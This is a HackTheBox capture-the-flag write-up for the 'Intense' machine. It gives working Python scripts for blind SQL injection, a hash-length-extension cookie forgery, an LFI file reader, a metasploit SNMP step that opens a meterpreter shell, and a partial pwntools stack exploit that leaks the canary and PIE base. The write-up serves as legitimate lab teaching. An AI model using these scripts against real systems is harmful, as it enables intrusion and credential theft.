---
description: SQL Injection, Hash Length Extension, LFI and binary exploitation
---

# Intense

## Overview

Intense is definitely the best box I have ever done on HTB, and I loved it every step of the way. We start by doing some general tampering on the website and, combined with source code analysis, we find an SQL injection vulnerability. As there is no controllable output, we can execute a boolean-based blind SQL injection attack and extract the `secret` character by character.

The hash is not crackable, but rather used to sign a custom JWT token to prove it's authentic. The hashing algorithm in use is vulnerable to a [Hash Length Extension](https://en.wikipedia.org/wiki/Length\_extension\_attack) attack, which allows us to append our own data to the hash and sign in as the `admin`. More source code analysis reveals admins have access to an API vulnerable to LFI.

Using the LFI we can grab an SNMP Read-Write Community string, which we can [leverage for RCE](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/). From here we exploit a vulnerable binary run by root to gain root access.

## Enumeration

### Nmap

`nmap` shows ports `22` and `80` open, so let's have a look at `80`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)
|   256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)
|_  256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Intense - WebApp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP

![](<../../.gitbook/assets/image (31).png>)

Couple things to note right away:

* We get given the default credentials `guest:guest`
* The app is **open source**

I'm going to download the source right away, and while that goes I'll sign in as `guest`.

First things first, I notice a cookie has been assigned:

```
auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Lye5tjuupon4SLXjM0Jpc/l6Xkm5+POtT6xFlDtho3I=
```

Looks like a custom JWT due to the two base64 strings separated by a `.`. Let's try decoding it.

```
username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
<<invalid text>>
```

The second part of the cookie looks like it's not ASCII. Based on how JWTs normally work, we'll assume it's the cookie signature.

### Source Code Analysis

Around now we crack open VS Code and have a look at how the cookie is made, along with possible attack vectors.

The cookies seem to be defined in `lwt.py`.

```python
def sign(msg):
    """ Sign message with secret key """
    return sha256(SECRET + msg).digest()
```

This function appears to create the _signature_ we saw as part of the JWT (I'll call it an LWT from now to avoid confusion). How is `SECRET` defined?

```python
SECRET = os.urandom(randrange(8, 15))
```

`SECRET` is completely random, which means that _hypothetically_ we shouldn't be able to forge the LWTs.

The base `app.py` has an interesting function, however:

```python
@app.route("/submitmessage", methods=["POST"])
def submitmessage():
    message = request.form.get("message", '')
    if len(message) > 140:
        return "message too long"
    if badword_in_str(message):
        return "forbidden word in message"
    # insert new message in DB
    try:
        query_db("insert into messages values ('%s')" % message)
    except sqlite3.Error as e:
        return str(e)
    return "OK"
```

If we use the _Send Message_ feature of the website, our data gets parsed immediately into a database query. There's no sanitisation involved (with the exception of checking that the message is within 140 characters), so we should be able to do some SQLi.

Note how the function returns the SQLite error if there is one, meaning we should get some feedback:

![](<../../.gitbook/assets/image (34).png>)

Now we know there is some SQL injection involved, let's think about what we need to extract. In `utils.py`, we see that there's a `try_login` function:

```python
def try_login(form):
    """ Try to login with the submitted user info """
    if not form:
        return None
    username = form["username"]
    password = hash_password(form["password"])
    result = query_db("select count(*) from users where username = ? and secret = ?", (username, password), one=True)
    if result and result[0]:
        return {"username": username, "secret":password}
    return None
```

Now we know there is a column called `username` and a column called `secret`. If we go back in the source, we can see that the `secret` is used for creating the LWTs.

In `app.py`:

```python
@app.route("/postlogin", methods=["POST"])
def postlogin():
    # return user's info if exists
    data = try_login(request.form)
    if data:
        resp = make_response("OK")
        # create new cookie session to authenticate user
        session = lwt.create_session(data)
        cookie = lwt.create_cookie(session)
        resp.set_cookie("auth", cookie)
        return resp
    return "Login failed"
```

Calling `lwt.create_session()` with the response:

```python
def create_session(data):
    """ Create session based on dict
        @data: {"key1":"value1","key2":"value2"}

        return "key1=value1;key2=value2;"
    """
    session = ""
    for k, v in data.items():
        session += f"{k}={v};"
    return session.encode()
```

Extracting the admin's `secret` might bring us one step closer to successfully logging in as the admin.

## SQL Injection

As only errors are returned, I originally attempted to trigger my own custom errors. In the end, though, I went for a boolean-based blind SQLi payload.

### Payload Formation

After a big of tampering, I finished on this payload:

```
yes') UNION SELECT CASE SUBSTR(username,0,1) WHEN 'a' THEN LOAD_EXTENSION('b') ELSE 'yes' END role FROM users--
```

* `CASE` tests the specific thing we give it
* `SUBSTR(username,0,1)` grabs the first character of the username
* `WHEN 'a'` is the other part of `CASE` - if the value, in this case the result of `SUBSTR()` is `a`, it'll then run `LOAD_EXTENSION('b')`. If not, it essentially does nothing.
* `LOAD_EXTENSION('b')` is just there to trigger the error if the first characters is `a` as there is likely to be no extension with the name `b`

### Extracting the admin username

We can assume the username is `admin`, but we should make sure.

We'll loop through `username` with every printable character and see if it matches. Note that it will also match `guest`, so there'll be **two** matches. The way I'll fix this is I'll print it out only if it's not the corresponding letter in the word `guest` and hope there are no common letters, although there's probably a better way.

If we find a match, we add it to the known string and go again.

```python
from requests import post
from string import printable

guest = 'guest_________'        # if len(username) > 5 to get no index errors
name = ""

i = 0

for i in range(10):            # assuming it's a maximum of 10 long
    for char in printable:
        message = f"yes') UNION SELECT CASE SUBSTR(username,{i + 1},1) WHEN '{char}' THEN LOAD_EXTENSION('b') ELSE 'yes' END role FROM users--"

        data = {'message': message}

        r = post('http://intense.htb/submitmessage', data=data)

        if r.text == "not authorized":
            if char != guest[i]:
                name += char
                print(f"char found: {char}")
print(name)
```

Success!

```
char found: a
char found: d
char found: m
char found: i
char found: n
admin
```

As expected, the username is `admin`. Now let's extract the secret.

### Extracting the admin secret

```python
from requests import post
from string import hexdigits

guest = '84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec'
admin = ''

i = 0

for i in range(0, len(guest)):
    for char in hexdigits:
        message = f"yes') UNION SELECT CASE SUBSTR(secret,{i + 1},1) WHEN '{char}' THEN LOAD_EXTENSION('b') ELSE 'yes' END role FROM users--"

        data = {'message': message}

        r = post('http://intense.htb/submitmessage', data=data)

        if r.text == "not authorized":
            if char != guest[i]:
                admin += char
                print(f"char found: {char}")

    # if at the end of trying all digits the secret isn't the expected length,
    # it must have shared a digit with the guest secret and we skipped over it
    # so we'll just append it
    if len(admin) != (i + 1):
        char = guest[i]
        admin += char
        print(f"char found: {char}")

print(admin)
```

We get the hash `f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105`, which appears to be the correct size:

```
$echo -n 'f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105' | wc -c
64
```

## Signing in as the admin

Now we have the secret, it's time to work out what we can use it for. The way the cookies are signed is vulnerable to a Hash Length Extension attack. A good explanation can be found [here](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks), but the basic theory is that even if you don't know the secret you can append data to the end of the hash simply by continuing the hashing algorithm.

I'll be using `hashpumpy` to extend the hashes.

```python
from base64 import b64encode
from requests import get
from hashpumpy import hashpump

current = b'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;'
signature = b'2f27b9b63baea689f848b5e333426973f97a5e49b9f8f3ad4fac45943b61a372'          # change per instance!
append = b';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'

for x in range(8, 15):
    new_signature, value = hashpump(signature, current, append, x)
    cookie = b64encode(value) + b'.' + b64encode(bytes.fromhex(new_signature))

    r = get('http://intense.htb/admin', cookies={'auth' : cookie.decode()})
    
    if r.status_code != 403:
        print(cookie)
```

{% hint style="danger" %}
The signature changes every reset, so make sure you update it!
{% endhint %}

I got the cookie

```
dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.Kj3kZb1zkyyn0eUdcAEy/u2k0TZJWvUAIDCmPuLqdNU=
```

Updating it in `Inspect Element` works!

![We're now an admin](<../../.gitbook/assets/image (29).png>)

## Analysing the Source as Admin

A logical place to look now would be `admin.py`.

```python
@admin.route("/admin/log/view", methods=["POST"])
def view_log():
    if not is_admin(request):
        abort(403)
    logfile = request.form.get("logfile")
    if logfile:
        logcontent = admin_view_log(logfile)
        return logcontent
    return ''


@admin.route("/admin/log/dir", methods=["POST"])
def list_log():
    if not is_admin(request):
        abort(403)
    logdir = request.form.get("logdir")
    if logdir:
        logdir = admin_list_log(logdir)
        return str(logdir)
    return ''
```

The admin viewing abilities allow you to read files. Interesting. Are `admin_view_log()` and `admin_list_dir()` safe?

```python
def admin_view_log(filename):
    if not path.exists(f"logs/{filename}"):
        return f"Can't find {filename}"
    with open(f"logs/{filename}") as out:
        return out.read()


def admin_list_log(logdir):
    if not path.exists(f"logs/{logdir}"):
        return f"Can't find {logdir}"
    return listdir(logdir)
```

Nope! Simple LFI flaw.

### Scripting the LFI

I made a simple, messy script.

```python
from requests import post

cookies = {'auth': 'dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.Kj3kZb1zkyyn0eUdcAEy/u2k0TZJWvUAIDCmPuLqdNU='}

while True:
    read = input('>>> ')

    cmd, *folder = read.split()

    if cmd == 'ls':
        loc = '../' * 8 + '..' + ''.join(folder)
        r = post('http://intense.htb/admin/log/dir', cookies=cookies, data={'logdir': loc})
        
        files = '\n'.join(eval(r.text))
        print(files)
    else:
        loc = '../' * 8 + '..' + read
        r = post('http://intense.htb/admin/log/view', cookies=cookies, data={'logfile': loc})

        print(r.text.rstrip())
```

If we read `/etc/passwd`, we see there's a user called `user`.

```
>>> /home/user/user.txt
6b5...
```

Now to find a way to get foothold.

After some searching (and some `nmap`) we find SNMP is open, so let's see what we can do with that.

```
>>> /etc/snmp/snmpd.conf
[...]
 rocommunity public  default    -V systemonly
 rwcommunity SuP3RPrivCom90
[...]
```

There's a `rwcommunity` called `SuP3RPrivCom90`. RW Communities can be [leveraged for RCE](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/). To do this, I'm going to use the metasploit `linux/snmp/net_snmpd_rw_access` module.

```
msf6 exploit(linux/snmp/net_snmpd_rw_access) > set COMMUNITY SuP3RPrivCom90        
COMMUNITY => SuP3RPrivCom90                                                                                                                                           
msf6 exploit(linux/snmp/net_snmpd_rw_access) > set RHOSTS intense.htb                                                                                                 
RHOSTS => intense.htb                                                                                                                                                 
msf6 exploit(linux/snmp/net_snmpd_rw_access) > set LHOST tun0                      
LHOST => tun0                                                                      
msf6 exploit(linux/snmp/net_snmpd_rw_access) > run
```

And we get a meterpreter shell! Our user is `Debian-snmp`.

## Finding Root

If we go into the home directory of `user`, we see a `note_server` and a `note_server.c`. Running `netstat -tunlp` tells us there is something listening on port 5001.

```
netstat -tunlp
[...]
tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN      -
[...]
```

We can dump the files using meterpreter.

```
meterpreter > download note_server
meterpreter > download note_server.c
```

Let's run the file and check if it's this that runs on port `5001`:

```
$ netstat -tunlp | grep note_server
tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN      9264/./note_server
```

Checking the source, it definitely does.

```c
/* Initialize socket structure */ 
bzero((char *) &serv_addr, sizeof(serv_addr));
portno = 5001;
```

As the program is running remotely, binary exploitation seems likely, so I'm going to dump the remote libc and linker as well:

```
$ ldd note_server
        linux-vdso.so.1 (0x00007ffee41ec000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f12b4eba000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f12b54ae000)
```

```
meterpreter > download /lib/x86_64-linux-gnu/libc.so.6
meterpreter > download /lib64/ld-linux-x86-64.so.2
```

I'll rename them to `libc-remote.so` and `ld-remote.so` respectively.

## Exploiting the Binary

### Summary

A few things lack bounds checking, allowing us to a) leak the stack and b) write to the stack.

### Analysis

The only part that's important is the `switch` statement within `handle_client()`, as it's in an infinite loop that gets run.

```c
switch(cmd) {
    // write note
    case 1:
        if (read(sock, &buf_size, 1) != 1) {
            exit(1);
        }

        // prevent user to write over the buffer
        if (index + buf_size > BUFFER_SIZE) {
            exit(1);
        }

        // write note
        if (read(sock, &note[index], buf_size) != buf_size) {
            exit(1);
        }

        index += buf_size;
    break;

    // copy part of note to the end of the note
    case 2:
        // get offset from user want to copy
        if (read(sock, &offset, 2) != 2) {
            exit(1);
        }

        // sanity check: offset must be > 0 and < index
        if (offset < 0 || offset > index) {
            exit(1);
        }

        // get the size of the buffer we want to copy
        if (read(sock, &copy_size, 1) != 1) {
            exit(1);
        }

        // prevent user to write over the buffer's note
        if (index > BUFFER_SIZE) {
            exit(1);
        }

        // copy part of the buffer to the end 
        memcpy(&note[index], &note[offset], copy_size);

        index += copy_size;
    break;

    // show note
    case 3:
        write(sock, note, index);
    return;

}
```

To summarise, the code can do the following:

* Write
  * Read input size - only one byte
  * Check if that would bring you over the max size
  * Read that many bytes
  * Increase `index` (a pointer to the end of the current note)
* Copy
  * Take in offset
  * Take in size
  * Check if `index` is out of range
  * Copy Data
  * Increase `index`
* Show
  * Write note contents

The main flaw here is the check for `copy` occurs _before `index` is increased_. So if we copy a massive chunk, the check will be passed anyway.

{% hint style="info" %}
The binary uses `fork()`, which means the memory will be identical for every connection. Same binary base, same libc base, same canary, same everything.
{% endhint %}

### Setup

First, some basic setup:

```python
from pwn import *

elf = context.binary = ELF('./note_server')

if args.REMOTE:
    libc = ELF('./libc-remote.so')
    p = process('127.0.0.1', 5002)      # for the portfwd
else:
    libc = elf.libc
    p = process('127.0.0.1', 5001)

### Wrapper Functions
def write(data):
    if isinstance(data, str):
        data = data.encode()

    p.send(b'\x01' + p8(len(data)) + data)


def copy(start=0, length=100):
    p.send(b'\x02' + p16(start) + p8(length))


def read():
    p.send(b'\x03')
    return p.clean(0.5)
```

### Leaking Canary and PIE

Now let's try writing 3 times then copying a massive amount.

```python
write('A' * 0xff)
write('B' * 0xff)
write('C' * 0xff)
copy(start=0xff*3, length=250)
print(read())
```

Well, we've leaked significantly more than the stuff we wrote, that's for sure. Let's _completely_ fill up the buffer, so we can work with the stuff after it. The buffer size is `1024` bytes, plus another 8 for the saved RBP.

```python
write('A' * 0xff)       # 255
write('B' * 0xff)       # 510
write('C' * 0xff)       # 765
write('D' * 0xff)       # 1020
write('E' * 4)          # 1024
copy(start=1024, length=32)

leaks = read()[1024:]

addrs = [u64(leaks[addr:addr+8]) for addr in range(0, len(leaks), 8)]
[print(hex(addr)) for addr in addrs]
```

```
0x7ffe9d91bbe0
0xdc185629f84e5a00            canary
0x7ffe9d91bbe0                rbp
0x565150b24f54                rip
```

Now we've successfully leaked, we can parse the values. Using radare2 and breaking on the `ret`, the offset between the leaked RIP value there and binary base is `0xf54`:

![](<../../.gitbook/assets/image (17).png>)

```python
leaks = read()[1032:]

canary = u64(leaks[:8])
log.success(f'Canary: {hex(canary)}')

ret_pointer = u64(leaks[16:24])
elf.address = ret_pointer - 0xf54
log.success(f'PIE Base: {hex(elf.address)}')
```

Now we need to somehow read a GOT entry. Since the binary uses `write()`, it's possible. But first we need to get the copy working in a way that it starts overwriting at _exactly_ the return pointer. With a bit of messing about, I got a function that seemed to work.

```python
def deliver_payload(payload):
    payload = 'A' * 12 + payload
    payload = payload.ljust(0xff, 'A')

    write(payload)
    write('B' * 0xff)
    write('C' * 0xff)
    write('D' * 0xff)

    copy(12 + len(payload))
```

We're 12 off the canary at the end, so we put 12 `A` characters ahead and copy 12 extra.

### Leaking LIBC

TODO
